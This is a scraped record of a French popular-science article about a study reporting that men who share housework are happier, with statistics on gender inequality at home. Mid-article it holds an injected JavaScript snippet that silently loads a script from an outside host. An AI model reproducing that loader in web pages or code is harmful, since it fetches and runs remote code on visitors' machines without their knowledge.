{"title": "Science decalee : les hommes sont plus heureux quand ils font le menage", "newspaper": "Futura Sciences", "author": ["Par Janlou Chaput, Futura"], "date_publi": "2017-08-26", "content": "En 2012, une etude venait tordre le cou aux idees recues des machos. A la grande surprise des auteurs, elle revelait que plus les hommes participent aux taches domestiques et plus ils vivent heureux. Et s'il suffisait de faire la vaisselle pour qu'un homme (me)nage dans le bonheur ? L'egalite des sexes, ce n'est pas encore pour aujourd'hui. Malgre les luttes feministes et les  mouvements  de liberation de la  femme  entames depuis une cinquantaine d'annees, les hommes occupent toujours les plus hautes fonctions dans la societe, ont encore un salaire plus important pour des fonctions equivalentes et passent moins de temps a accomplir les taches menageres. Pourtant, voila un argument qui pourrait pousser ces messieurs a changer. Et si la science leur prouvait a coup de statistiques que participer aux  activites domestiques  les rendait plus heureux ? C'est exactement ce qui vient d'etre fait. On ne pourra pas accuser les chercheurs d'avoir oriente leurs resultats puisqu'eux-memes ne s'attendaient pas a pareil constat...  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Le contexte : une inegalite criante entre hommes et femmes Difficile de sortir des stereotypes. Si l'egalite des sexes transparait plus facilement dans les discours aujourd'hui qu'il y a 50 ans, elle ne s'applique pas toujours dans les actes. Ainsi, une vaste etude, dont les resultats sont publies dans un livre nomme  Gendered Lives  dans sa version originale, tente de faire le point sur la situation du continent europeen... et revele qu'il y a encore du travail a faire. Au niveau professionnel notamment, car les femmes sont parfois amenees a choisir entre leur carriere et le fait de fonder une famille. La tradition de la bonne mere au  foyer  et de l' homme  besognant pour nourrir sa famille est toujours bien pregnante, meme inconsciemment. Les chiffres parlent d'eux-memes au Royaume-Uni, ou 40 % des femmes travaillent a temps partiel contre 10 % des hommes. Il a fallu du temps pour accorder des droits similaires aux hommes et aux femmes. En France, il faudra attendre 1945 pour voir la gent feminine faire entendre sa voix lors d'une election. Aujourd'hui, les differences sont moindres mais elles existent toujours. (c) Open Democracy, Flickr, cc by 2.0                               Dans le foyer aussi les inegalites subsistent. L'Insee devoile dans son  Emploi du temps 2009-2010  que les hommes contribuent aux taches menageres a hauteur de 2 h 24 par jour, chiffre stable depuis 10 ans, tandis que les femmes y consacrent quotidiennement 3 h 52, un chiffre pourtant en legere baisse. Les choses sont-elles immuables ? L'etude : comment faire un menage heureux ? La gent feminine a peut-etre l'occasion de se rejouir. Comme l'explique la prestigieuse  University of Cambridge , l'ouvrage susnomme s'interesse au bien-etre des hommes en comparaison du temps passe a collaborer aux activites domestiques, telles que faire la cuisine, la vaisselle, les courses,  faire le menage  ou encore la  maintenance  domestique. Contrairement a ce qui etait attendu, les hommes d'Allemagne, du Danemark, de France, de Grande-Bretagne, de Norvege, des Pays-Bas et de Suede se declarent plus a l'aise et moins stresses lorsqu'ils participent aux taches menageres. Ils sont donc plus heureux. Quelle est donc la cle de ce  bonheur  ? Est-ce de tremper la serpillere dans un seau humide ? L'odeur allechante d'un repas qu'on a pris le temps de preparer ? Selon les scientifiques, une evolution des moeurs s'insinue peu a peu dans l'esprit des gens et les hommes commencent a culpabiliser de regarder leur compagne faire le plus gros du travail. D'autre part, les femmes osent davantage reclamer un traitement equitable, la encore du fait de changements de consideration dans la societe, et les hommes besogneux ne subissent pas les  foudres  d'une epouse en colere. Moins de disputes, plus de calme, chacun peut vivre tranquillement. Des taches partagees pour un bonheur partage... Ou comment etre heureux en menage ! L'oeil exterieur : des progres restent a faire Globalement, cet ouvrage tend a montrer l'impact des discours  culturels  et societaux dans la mise en place d'un traitement egalitaire entre hommes et femmes. Ainsi, dans les pays scandinaves, qui clament depuis de longues annees l'absence de difference entre les unes et les autres, le fosse se reduit peu a peu. De generations en generations, ces siecles de stereotypes finiront peut-etre par etre balayes. Mais qui sera derriere le balai : un homme ou une femme ? ", "theme": "sante"}